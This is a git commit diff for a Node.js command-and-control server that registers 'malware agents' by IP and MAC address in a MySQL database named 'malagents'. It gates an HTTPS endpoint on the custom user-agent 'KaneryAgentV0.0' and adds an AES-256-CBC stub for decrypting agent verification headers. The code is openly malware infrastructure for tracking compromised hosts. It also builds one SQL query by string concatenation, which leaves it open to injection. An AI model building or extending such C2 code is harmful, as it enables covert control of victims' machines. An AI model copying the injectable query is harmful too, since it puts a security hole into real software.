bfc7b36c1b8ad8bb4dc9c3918387cce148390006
Edward Iason Leonard <edward.leonard2024@gmail.com>
2025-03-24 16:32:31 +0000

    Adjusted DB connections to include async functions and changed connection type to a pool for asychronisity. Added base function for decrypting headers and added in user-agent header checks to ensure that connections from non-agents are rejected.

--- C2Server/Server/C2Server.js
+++ C2Server/Server/C2Server.js
@@ -4,9 +4,27 @@ const dbConn = require('./DBConnection.js');
 const express = require('express');
 const https = require('https');
 const fs = require('fs');
+const crypto = require('crypto');
 
+//HTTPS Certificates/Keys
 const certPath = fs.readFileSync(path.resolve(__dirname, config.Keys.CertPath), 'utf8');
 const privateKeyPath = fs.readFileSync(path.resolve(__dirname, config.Keys.PrivateKeyPath), 'utf8');
+const AgentHeaderKey = config.Keys.AgentDecryptedKey;
+
+/*Decryption Function. Agent generates an IV and encrypts the key with AES-256-CBC.
+This function separates the first 32 bytes (IV) from the rest of the encrypted key and decrypts it.
+Only fully implement functionality once an Agent is created.
+*/
+function decryptVerificationHeader(verHeader){
+    var iv = verHeader.slice(0, 32);
+    var encryptedText = verHeader.slice(32, verHeader.length);
+
+    var decipher = crypto.createDecipheriv("aes-256-cbc", Buffer.from(AgentHeaderKey), iv);
+    var decrypted = decipher.update(encryptedText, 'hex', 'utf8');
+    decrypted += decipher.final('utf8');   
+
+    return decrypted;
+}
 
 
 const options = {
@@ -18,16 +36,24 @@ const app = express();
 app.use(express.json());
 
 
+//Routes
+
+//Establish a new malware agent. Checks User Agent header/Todo: Add decryption to check for key. Protects against unwanted/unauthorised agents.
 app.post('/establishAgent', (req, res) => {
-    console.log("Body: ");
-    console.log(req.body);
     console.log("Headers: ");
     console.log(req.headers);
-    res.send("Hello World! Responses are working!");
+    var userAgent = req.headers['user-agent'];
+    //var verHeader = req.headers['Verification-Header'];
+    if (userAgent != "KaneryAgentV0.0"){
+        res.send("403 Forbidden")
+    } else {
+        dbConn.establishNewAgent(req.body.IPAddr, req.body.MACAddr);
+        //decryptVerificationHeader(verHeader);
+        res.send("200 OK");
+    }
 });
 
+//Server listening.
 https.createServer(options, app).listen(config.Server.Port, () => {
     console.log(`Server started on port ${config.Server.Port}`);
 });
-
-dbConn.readActiveConnections();
--- C2Server/Server/DBConnection.js
+++ C2Server/Server/DBConnection.js
@@ -1,25 +1,57 @@
-const mysql = require('mysql');
+const mysql = require('mysql2');
 const config = require('../Config/ServerConfig.env.json');
 
-var conn = mysql.createConnection({
+var pool = mysql.createPool({
     host: config.Database.Host,
     user: config.Database.User,
-    password: config.Database.Password
+    password: config.Database.Password,
+    database: config.Database.Database,
+    waitForConnections: true,
+    connectionLimit: 10,
+    queueLimit: 0
 });
 
-
-function readActiveConnections(){
-    conn.connect(function(err){
-        if(err) throw err;
-        var sql = "SELECT * FROM malagents.agents WHERE agentStatus = 1";
-        conn.query(sql, function(err, results){
-            if (err) throw err;
-            console.log(results);
-            conn.end();
-        });
-    });
+//Dupe checks.
+async function checkDuplicateAgent(agentIP, agentMAC){
+    //Check if agent exists. Need to actually add the check.
+    var sql = "SELECT * FROM malagents.agents WHERE agentIP = '" + agentIP + "' OR agentMAC = '" + agentMAC + "'";
+    try{
+        const conn = await pool.promise().getConnection();
+        const [results] = await conn.query(sql);
+        console.log(results);
+        conn.release();
+    } catch (err) {
+        console.error('Error:', err);
+    }
 }
 
+//Baseline functions.
+async function readActiveConnections() {
+    try {
+        const conn = await pool.promise().getConnection();
+        const [results] = await conn.query('SELECT * FROM malagents.agents WHERE agentStatus = 1');
+        console.log(results);
+        conn.release();
+    } catch (err) {
+        console.error('Error:', err);
+    }
+}
+
+async function establishNewAgent(agentIP, agentMAC) {
+    try {
+        const conn = await pool.promise().getConnection();
+        await checkDuplicateAgent(agentIP, agentMAC);
+        const sql = "INSERT INTO malagents.agents (agentIP, agentStatus, agentMAC) VALUES (?, 1, ?)";
+        const [results] = await conn.query(sql, [agentIP, agentMAC]);
+        console.log('New agent added:', results);
+        conn.release();
+    } catch (err) {
+        console.error('Error:', err);
+    } 
+}
+
+
 module.exports= {
-    readActiveConnections
+    readActiveConnections,
+    establishNewAgent
 };
